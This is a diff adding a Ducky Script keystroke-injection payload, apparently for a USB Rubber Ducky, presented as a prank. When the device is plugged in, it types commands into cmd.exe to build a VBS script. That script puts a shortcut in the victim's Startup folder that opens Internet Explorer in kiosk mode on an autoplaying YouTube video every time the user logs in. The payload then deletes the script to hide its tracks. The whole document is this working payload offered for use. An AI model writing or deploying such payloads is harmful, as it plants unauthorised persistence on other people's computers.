@@ -1,0 +1,33 @@
+REM YouveBeenUglyRolled By petertfm
+REM payload creats a vbs script that is run to make a YouveBeenUglyRolled.lnk to IE in the users start-up folder
+REM IE is set to run in kiosk mode "-K" and links to youtube with a very annoying lady gaga with jim carrey's face video
+REM note if running in 64 bit windows, you may need to change %programfiles% with %programfiles(x86)% flash player 64 bit may not be installed!
+ESCAPE
+GUI r
+DELAY 120
+STRING cmd.exe
+ENTER
+DELAY 325
+STRING copy con YouveBeenUglyRolled.vbs
+ENTER
+STRING Set WshShell = WScript.CreateObject("WScript.Shell"):
+STRING StrMyStartUp = WshShell.SpecialFolders("Startup"):
+STRING Set lnk = WshShell.CreateShortcut(StrMyStartUp + "\YouveBeenUglyRolled.lnk"):
+ENTER
+STRING lnk.TargetPath = "%programfiles%\Internet Explorer\iexplore.exe":
+REM place any link here, this one is a very annoying lady gaga with jim carrey's face
+REM the -K option makes IE run in kiosk mode
+STRING lnk.Arguments = "-K http://www.youtube.com/v/XYYo3T6nCw8?autoplay=1":
+REM also try http://www.youtube.com/v/9WZGyzz5O-U?autoplay=1 for katy perry rip, or
+REM http://www.youtube.com/v/HqGsT6VM8Vg?autoplay=1 for scary car video
+STRING lnk.Save
+ENTER
+CTRL z
+ENTER
+STRING YouveBeenUglyRolled.vbs
+ENTER
+DELAY 200
+STRING DEL YouveBeenUglyRolled.vbs
+ENTER
+STRING EXIT
+ENTER
